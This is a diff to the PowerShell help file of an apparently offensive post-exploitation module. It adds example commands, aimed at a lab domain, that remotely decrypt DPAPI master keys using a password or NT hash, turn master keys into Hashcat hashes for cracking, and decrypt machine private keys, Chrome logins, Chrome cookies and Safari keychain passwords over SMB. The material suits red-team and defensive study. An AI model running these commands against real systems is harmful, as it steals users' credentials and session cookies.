@@ -149,7 +149,8 @@
       <command:verb>Get</command:verb>
       <command:noun>TBODpapiMasterKeys</command:noun>
       <maml:description>
-        <maml:para>Decrypts DPAPI master keys using DPAPI_SYSTEM from LSA secrets.</maml:para>
+        <maml:para>Decrypts DPAPI master keys.</maml:para>
+        <maml:para>Machine scope uses DPAPI_SYSTEM from LSA secrets, while user scope can be decrypted via user SID plus password or NT hash. When present, CREDHIST is used to handle password changes for user-scoped keys.</maml:para>
       </maml:description>
     </command:details>
     <command:syntax>
@@ -182,6 +183,14 @@
         <command:parameter required="false">
           <maml:name>DpapiUserKeyBytes</maml:name>
           <command:parameterValue>Byte[]</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>UserPassword</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>UserNtlmHash</maml:name>
+          <command:parameterValue>String</command:parameterValue>
         </command:parameter>
       </command:syntaxItem>
     </command:syntax>
@@ -235,6 +244,20 @@
         </maml:description>
         <command:parameterValue>Byte[]</command:parameterValue>
       </command:parameter>
+      <command:parameter>
+        <maml:name>UserPassword</maml:name>
+        <maml:description>
+          <maml:para>Password used to derive user-scoped DPAPI key material (SID + password).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>UserNtlmHash</maml:name>
+        <maml:description>
+          <maml:para>Hex-encoded NT hash (or LM:NT string) used to derive user-scoped DPAPI key material (SID + NTHash). Only the NT portion is used.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
     </command:parameters>
     <command:examples>
       <command:example>
@@ -256,6 +279,95 @@
         <maml:code>Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machine -ShareName C$</maml:code>
         <maml:remarks>
           <maml:para>Decrypts only machine master keys from the specified share.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 4 --------------------------</command:title>
+        <maml:code>Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'</maml:code>
+        <maml:remarks>
+          <maml:para>Decrypts user profile master keys using SID + password-derived key material.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 5 --------------------------</command:title>
+        <maml:code>Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserNtlmHash '0123456789abcdef0123456789abcdef'</maml:code>
+        <maml:remarks>
+          <maml:para>Decrypts user profile master keys using SID + NT hash-derived key material.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <command:command>
+    <command:details>
+      <command:name>Get-TBODpapiMasterKeyHashes</command:name>
+      <command:verb>Get</command:verb>
+      <command:noun>TBODpapiMasterKeyHashes</command:noun>
+      <maml:description>
+        <maml:para>Formats DPAPI master key files into John/Hashcat DPAPImk hashes for offline password cracking.</maml:para>
+        <maml:para>The primary output is HashLine in the format {GUID}:$DPAPImk$... Preferred keys are highlighted when a Preferred file is present.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Get-TBODpapiMasterKeyHashes</command:name>
+        <command:parameter required="true" position="0">
+          <maml:name>ServerName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Scope</maml:name>
+          <command:parameterValue>DpapiMasterKeyScope</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>ShareName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="true" position="0">
+        <maml:name>ServerName</maml:name>
+        <maml:description>
+          <maml:para>Remote host name.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Scope</maml:name>
+        <maml:description>
+          <maml:para>Limit enumeration to machine, user, or both scopes (default: User).</maml:para>
+        </maml:description>
+        <command:parameterValue>DpapiMasterKeyScope</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>ShareName</maml:name>
+        <maml:description>
+          <maml:para>SMB share name to use for file access (default: C$).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>Get-TBODpapiMasterKeyHashes -ServerName corp1-web01.corp1.lab.home-labs.lol</maml:code>
+        <maml:remarks>
+          <maml:para>Enumerates user-scoped master keys and formats them into John/Hashcat DPAPImk hashes.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Get-TBODpapiMasterKeyHashes -ServerName corp1-web01.corp1.lab.home-labs.lol | Select-Object -ExpandProperty HashLine | Set-Content -Encoding ascii .\dpapi-masterkey-hashes.txt</maml:code>
+        <maml:remarks>
+          <maml:para>Writes only the John/Hashcat hash lines to a file.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 3 --------------------------</command:title>
+        <maml:code>Get-TBODpapiMasterKeyHashes -ServerName corp1-web01.corp1.lab.home-labs.lol | Where-Object IsPreferred | Select-Object -ExpandProperty HashLine</maml:code>
+        <maml:remarks>
+          <maml:para>Filters to preferred master keys to prioritize cracking.</maml:para>
         </maml:remarks>
       </command:example>
     </command:examples>
@@ -525,6 +637,393 @@ Get-TBODpapiBlob -ServerName corp1-web01.corp1.lab.home-labs.lol -Path $blob.Pat
         <maml:code>Get-TBODpapiBlob -ServerName corp1-web01.corp1.lab.home-labs.lol -RegistryPath HKLM\Software\Contoso -ValueName Blob -MasterKey $mk.MasterKey</maml:code>
         <maml:remarks>
           <maml:para>Decrypts a DPAPI blob stored in a registry value.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <command:command>
+    <command:details>
+      <command:name>Get-TBOMachineCertificates</command:name>
+      <command:verb>Get</command:verb>
+      <command:noun>TBOMachineCertificates</command:noun>
+      <maml:description>
+        <maml:para>Enumerates machine RSA private keys (CAPI and CNG), decrypts DPAPI-protected key material using machine DPAPI master keys, and maps keys to LocalMachine\My certificates when possible.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Get-TBOMachineCertificates</command:name>
+        <command:parameter required="true" position="0">
+          <maml:name>ServerName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>ShareName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="true">
+          <maml:name>MasterKeys</maml:name>
+          <command:parameterValue>TboDpapiMasterKeyInfo[]</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>ShowAll</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>SkipCng</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="true" position="0">
+        <maml:name>ServerName</maml:name>
+        <maml:description>
+          <maml:para>Remote host name.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>ShareName</maml:name>
+        <maml:description>
+          <maml:para>SMB share name to use for key file access (default: C$).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="true">
+        <maml:name>MasterKeys</maml:name>
+        <maml:description>
+          <maml:para>Machine-scope DPAPI master keys (from Get-TBODpapiMasterKeys -Scope Machine).</maml:para>
+        </maml:description>
+        <command:parameterValue>TboDpapiMasterKeyInfo[]</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>ShowAll</maml:name>
+        <maml:description>
+          <maml:para>Return recovered keys and decrypt failures even when a key does not map to a LocalMachine\My certificate.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>SkipCng</maml:name>
+        <maml:description>
+          <maml:para>Skip CNG key locations and only scan CAPI MachineKeys.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>$keys = Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
+  Get-TBODpapiMasterKeys -Scope Machine
+Get-TBOMachineCertificates -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $keys</maml:code>
+        <maml:remarks>
+          <maml:para>Decrypts machine private keys and returns those that map to LocalMachine\My certificates.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Get-TBOMachineCertificates -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $keys -ShowAll</maml:code>
+        <maml:remarks>
+          <maml:para>Includes unmatched keys and decrypt failures.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 3 --------------------------</command:title>
+        <maml:code>Get-TBOMachineCertificates -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $keys -SkipCng</maml:code>
+        <maml:remarks>
+          <maml:para>Only scans CAPI MachineKeys and skips CNG key directories.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <command:command>
+    <command:details>
+      <command:name>Get-TBOChromeLogins</command:name>
+      <command:verb>Get</command:verb>
+      <command:noun>TBOChromeLogins</command:noun>
+      <maml:description>
+        <maml:para>Reads Chrome's Login Data SQLite database over SMB and decrypts saved passwords.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Get-TBOChromeLogins</command:name>
+        <command:parameter required="true" position="0">
+          <maml:name>ServerName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>ShareName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>ProfileName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>UserName</maml:name>
+          <command:parameterValue>String[]</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="true">
+          <maml:name>MasterKeys</maml:name>
+          <command:parameterValue>TboDpapiMasterKeyInfo[]</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="true" position="0">
+        <maml:name>ServerName</maml:name>
+        <maml:description>
+          <maml:para>Remote host name.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>ShareName</maml:name>
+        <maml:description>
+          <maml:para>SMB share name to use for file access (default: C$).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>ProfileName</maml:name>
+        <maml:description>
+          <maml:para>Chrome profile folder name under User Data (default: Default).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>UserName</maml:name>
+        <maml:description>
+          <maml:para>Optional user profile filters (wildcards supported).</maml:para>
+        </maml:description>
+        <command:parameterValue>String[]</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="true">
+        <maml:name>MasterKeys</maml:name>
+        <maml:description>
+          <maml:para>DPAPI master key objects (from Get-TBODpapiMasterKeys). Entries are matched by MasterKeyGuid.</maml:para>
+        </maml:description>
+        <command:parameterValue>TboDpapiMasterKeyInfo[]</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
+Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys</maml:code>
+        <maml:remarks>
+          <maml:para>Decrypts saved Chrome logins for accessible user profiles.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -ProfileName 'Profile 2' -MasterKeys $userKeys</maml:code>
+        <maml:remarks>
+          <maml:para>Filters to a specific user and non-default Chrome profile folder.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <command:command>
+    <command:details>
+      <command:name>Get-TBOChromeCookies</command:name>
+      <command:verb>Get</command:verb>
+      <command:noun>TBOChromeCookies</command:noun>
+      <maml:description>
+        <maml:para>Reads Chrome's Cookies SQLite database over SMB and decrypts cookie values.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Get-TBOChromeCookies</command:name>
+        <command:parameter required="true" position="0">
+          <maml:name>ServerName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>ShareName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>ProfileName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>UserName</maml:name>
+          <command:parameterValue>String[]</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="true">
+          <maml:name>MasterKeys</maml:name>
+          <command:parameterValue>TboDpapiMasterKeyInfo[]</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="true" position="0">
+        <maml:name>ServerName</maml:name>
+        <maml:description>
+          <maml:para>Remote host name.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>ShareName</maml:name>
+        <maml:description>
+          <maml:para>SMB share name to use for file access (default: C$).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>ProfileName</maml:name>
+        <maml:description>
+          <maml:para>Chrome profile folder name under User Data (default: Default).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>UserName</maml:name>
+        <maml:description>
+          <maml:para>Optional user profile filters (wildcards supported).</maml:para>
+        </maml:description>
+        <command:parameterValue>String[]</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="true">
+        <maml:name>MasterKeys</maml:name>
+        <maml:description>
+          <maml:para>DPAPI master key objects (from Get-TBODpapiMasterKeys). Entries are matched by MasterKeyGuid.</maml:para>
+        </maml:description>
+        <command:parameterValue>TboDpapiMasterKeyInfo[]</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
+Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys</maml:code>
+        <maml:remarks>
+          <maml:para>Decrypts saved Chrome cookies for accessible user profiles.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -MasterKeys $userKeys |
+  Select-Object HostKey, Name, Value, ExpiresUtc</maml:code>
+        <maml:remarks>
+          <maml:para>Filters to a specific user and selects common fields.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <command:command>
+    <command:details>
+      <command:name>Get-TBOSafariKeychain</command:name>
+      <command:verb>Get</command:verb>
+      <command:noun>TBOSafariKeychain</command:noun>
+      <maml:description>
+        <maml:para>Parses Safari for Windows keychain.plist files and decrypts DPAPI-protected password entries.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Get-TBOSafariKeychain</command:name>
+        <command:parameter required="true" position="0">
+          <maml:name>ServerName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>ShareName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>UserName</maml:name>
+          <command:parameterValue>String[]</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="true">
+          <maml:name>MasterKeys</maml:name>
+          <command:parameterValue>TboDpapiMasterKeyInfo[]</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+      <command:syntaxItem>
+        <command:name>Get-TBOSafariKeychain</command:name>
+        <command:parameter required="true" position="0">
+          <maml:name>ServerName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="true" position="1">
+          <maml:name>Path</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="true">
+          <maml:name>MasterKeys</maml:name>
+          <command:parameterValue>TboDpapiMasterKeyInfo[]</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="true" position="0">
+        <maml:name>ServerName</maml:name>
+        <maml:description>
+          <maml:para>Remote host name.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>ShareName</maml:name>
+        <maml:description>
+          <maml:para>SMB share name to use for file access when enumerating user profiles (default: C$).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>UserName</maml:name>
+        <maml:description>
+          <maml:para>Optional user profile filters (wildcards supported).</maml:para>
+        </maml:description>
+        <command:parameterValue>String[]</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Path</maml:name>
+        <maml:description>
+          <maml:para>UNC path or TBO.Smb2 drive path to a keychain.plist file.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="true">
+        <maml:name>MasterKeys</maml:name>
+        <maml:description>
+          <maml:para>DPAPI master key objects (from Get-TBODpapiMasterKeys). Entries are matched by MasterKeyGuid.</maml:para>
+        </maml:description>
+        <command:parameterValue>TboDpapiMasterKeyInfo[]</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
+Get-TBOSafariKeychain -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys</maml:code>
+        <maml:remarks>
+          <maml:para>Decrypts Safari keychain entries for accessible user profiles.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Get-TBOSafariKeychain -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -MasterKeys $userKeys</maml:code>
+        <maml:remarks>
+          <maml:para>Filters enumeration to a specific user profile.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 3 --------------------------</command:title>
+        <maml:code>Get-TBOSafariKeychain -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Users\jsmith\AppData\Roaming\Apple Computer\Safari\keychain.plist' -MasterKeys $userKeys</maml:code>
+        <maml:remarks>
+          <maml:para>Reads and decrypts a specific keychain.plist file path.</maml:para>
         </maml:remarks>
       </command:example>
     </command:examples>
